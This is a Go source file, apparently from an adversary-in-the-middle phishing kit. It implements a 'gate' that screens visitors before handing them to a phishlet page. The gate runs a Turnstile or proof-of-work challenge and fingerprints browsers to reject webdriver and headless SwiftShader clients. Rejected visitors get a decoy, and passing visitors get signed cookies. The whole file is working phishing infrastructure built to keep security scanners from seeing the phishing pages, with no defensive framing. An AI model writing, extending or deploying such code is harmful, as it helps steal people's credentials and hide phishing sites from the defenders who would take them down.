package core

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/elazarl/goproxy"
)

type VerifyResult struct {
	Redirect string
	Cookies  []*http.Cookie
}

type Gate struct {
	secret     []byte
	turnstile  string
	siteKey    string
	tokenStore *TokenStore
	keyStore   *KeyStore
}

func NewGate(ts *TokenStore, ks *KeyStore) *Gate {
	s := make([]byte, 32)
	rand.Read(s)
	g := &Gate{secret: s, tokenStore: ts, keyStore: ks}
	if v := os.Getenv("TURNSTILE_SECRET"); v != "" {
		g.turnstile = v
		g.siteKey = os.Getenv("TURNSTILE_SITEKEY")
	}
	return g
}

// ServeChallenge renders the gate page for a pending token.
// Returns nil if the token is not pending (caller falls through).
func (g *Gate) ServeChallenge(req *http.Request, token string) *http.Response {
	if g.tokenStore.State(token) != tokenPending {
		return nil
	}

	var challenge string
	if g.turnstile != "" {
		challenge = fmt.Sprintf(`
<div id="ts"></div>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
<script>
window.onload=function(){
  turnstile.render("#ts",{
    sitekey:%q,
    callback:function(tok){document.getElementById("ts_token").value=tok;document.getElementById("gateform").submit();}
  });
};
</script>
<form id="gateform" method="POST" action="/__gate/verify">
<input type="hidden" name="token" value=%q>
<input type="hidden" name="ts_token" id="ts_token" value="">
</form>`, g.siteKey, token)
	} else {
		nonce := randomNonce()
		challenge = fmt.Sprintf(`
<div id="status">Verifying browser...</div>
<form id="gateform" method="POST" action="/__gate/verify">
<input type="hidden" name="token" value=%q>
<input type="hidden" name="proof" id="proof" value="">
<input type="hidden" name="fp" id="fp" value="">
</form>
<script>
(async function(){
  const enc = new TextEncoder();
  const nonce = %q;
  let n = 0;
  const target = 0x00ffffff;
  while (true) {
    const buf = await crypto.subtle.digest("SHA-256", enc.encode(nonce + ":" + n));
    const v = new DataView(buf);
    if (v.getUint32(0) < target) { document.getElementById("proof").value = n; break; }
    n++;
    if (n > 50000000) { break; }
  }
  const gl = document.createElement("canvas").getContext("webgl");
  const dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
  const fp = {
    wd: navigator.webdriver === true,
    gl: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "",
    sw: screen.width, sh: screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    hc: navigator.hardwareConcurrency || 0,
    touch: "ontouchstart" in window
  };
  document.getElementById("fp").value = btoa(JSON.stringify(fp));
  document.getElementById("status").textContent = "Verified. Loading...";
  document.getElementById("gateform").submit();
})();
</script>`, token, nonce)
	}

	body := `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Checking your browser...</title>
<style>body{font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#fafafa;color:#333}#status{font-size:15px}</style>
</head><body>` + challenge + `</body></html>`

	resp := goproxy.NewResponse(req, "text/html; charset=UTF-8", http.StatusOK, body)
	resp.Header.Set("Cache-Control", "no-store")
	resp.Header.Set("X-Frame-Options", "DENY")
	return resp
}

// Verify checks the gate POST. On success returns cookies + redirect target;
// on failure returns nil so the caller can decoy.
func (g *Gate) Verify(r *http.Request, clientIP string) *VerifyResult {
	if err := r.ParseForm(); err != nil {
		return nil
	}
	token := r.FormValue("token")
	tsTok := r.FormValue("ts_token")
	proof := r.FormValue("proof")
	fpB64 := r.FormValue("fp")

	if token == "" {
		return nil
	}
	if g.tokenStore.State(token) != tokenPending {
		return nil
	}
	phishlet := g.tokenStore.Phishlet(token)
	if phishlet == "" {
		return nil
	}

	if g.turnstile != "" {
		if !verifyTurnstile(g.turnstile, tsTok, clientIP) {
			return nil
		}
	} else {
		if !verifySelfHosted(proof, fpB64) {
			return nil
		}
	}

	g.tokenStore.MarkGated(token)
	key := g.keyStore.Put(token)
	result := &VerifyResult{
		Redirect: "/p/" + token,
		Cookies: []*http.Cookie{
			{
				Name: "__g", Value: g.signGateCookie(token, phishlet, clientIP),
				Path: "/p/", HttpOnly: true, Secure: true,
				SameSite: http.SameSiteLaxMode, MaxAge: 300,
			},
			{
				Name: "__k", Value: base64.RawURLEncoding.EncodeToString(key),
				Path: "/p/", HttpOnly: false, Secure: true,
				SameSite: http.SameSiteLaxMode, MaxAge: 300,
			},
		},
	}
	return result
}

func verifySelfHosted(proof, fpB64 string) bool {
	if proof == "" || fpB64 == "" {
		return false
	}
	raw, err := base64.StdEncoding.DecodeString(fpB64)
	if err != nil {
		return false
	}
	var fp struct {
		WD    bool   `json:"wd"`
		GL    string `json:"gl"`
		SW    int    `json:"sw"`
		HC    int    `json:"hc"`
		Touch bool   `json:"touch"`
	}
	if json.Unmarshal(raw, &fp) != nil {
		return false
	}
	if fp.WD {
		return false
	}
	if fp.GL == "" {
		return false
	}
	if strings.Contains(strings.ToLower(fp.GL), "swiftshader") {
		return false
	}
	if fp.SW == 0 {
		return false
	}
	return true
}

func verifyTurnstile(secret, token, ip string) bool {
	if token == "" {
		return false
	}
	form := url.Values{}
	form.Set("secret", secret)
	form.Set("response", token)
	form.Set("remoteip", ip)
	resp, err := http.PostForm("https://challenges.cloudflare.com/turnstile/v0/siteverify", form)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	var out struct {
		Success bool `json:"success"`
	}
	json.NewDecoder(io.LimitReader(resp.Body, 4096)).Decode(&out)
	return out.Success
}

func (g *Gate) signGateCookie(token, phishlet, ip string) string {
	exp := time.Now().Add(5 * time.Minute).Unix()
	msg := fmt.Sprintf("%s|%s|%s|%d", token, phishlet, ip, exp)
	mac := hmac.New(sha256.New, g.secret)
	mac.Write([]byte(msg))
	return msg + "|" + hex.EncodeToString(mac.Sum(nil))
}

// hasValidGateCookie returns true when the request carries an __g cookie
// matching token, IP, and HMAC, and not expired.
func (g *Gate) hasValidGateCookie(r *http.Request, token, clientIP string) bool {
	c, err := r.Cookie("__g")
	if err != nil {
		return false
	}
	parts := strings.SplitN(c.Value, "|", 5)
	if len(parts) != 5 {
		return false
	}
	if parts[0] != token {
		return false
	}
	if parts[2] != clientIP {
		return false
	}
	expUnix, err := strconv.ParseInt(parts[3], 10, 64)
	if err != nil || time.Now().Unix() > expUnix {
		return false
	}
	mac := hmac.New(sha256.New, g.secret)
	mac.Write([]byte(strings.Join(parts[:4], "|")))
	expected := hex.EncodeToString(mac.Sum(nil))
	return hmac.Equal([]byte(expected), []byte(parts[4]))
}

func randomNonce() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}